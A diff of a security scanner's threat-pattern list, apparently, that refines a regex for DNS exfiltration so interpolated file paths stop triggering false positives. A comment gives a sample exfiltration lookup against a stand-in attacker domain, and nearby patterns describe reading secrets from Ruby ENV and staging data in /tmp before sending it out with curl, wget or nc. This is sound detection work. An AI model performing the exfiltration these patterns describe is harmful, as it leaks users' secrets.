@@ -147,8 +147,12 @@ THREAT_PATTERNS = [
     # Case-sensitive Ruby ENV: (?-i:) keeps Python `env[...]` dict access from matching under IGNORECASE.
     (r'(?-i:ENV)\[.*(?:KEY|TOKEN|SECRET|PASSWORD)', "ruby_env_secret", "critical", "exfiltration", "reads secret via Ruby ENV[]"),
     # ── Exfiltration: DNS and staging ──
-    # Do not match flag names such as llama.cpp `--host 127.0.0.1 --port $PORT`.
-    (r'(?<![-/])\b(dig|nslookup|host)\s+[^\n]*\$',
+    # Do not match flag names such as llama.cpp `--host 127.0.0.1 --port $PORT`. The `$`-interpolated
+    # token must be a DNS argument, not a path: prose like "Set the host value and run
+    # `${SKILL_DIR}/scripts/check.py`." interpolates a path (the `$…` token contains `/` or `\`),
+    # while a lookup interpolates a hostname — `host $DATA.attacker.com` — and a hostname cannot
+    # contain a slash, so only unqueryable forms are exempted (#108873).
+    (r'(?<![-/])\b(dig|nslookup|host)\s+[^\n]*\$(?![^\s\n]*[/\\])',
      "dns_exfil", "critical", "exfiltration", "DNS lookup with variable interpolation (possible DNS exfiltration)"),
     (r'>\s*/tmp/[^\s]*\s*&&\s*(curl|wget|nc|python)',
      "tmp_staging", "critical", "exfiltration", "writes to /tmp then exfiltrates"),
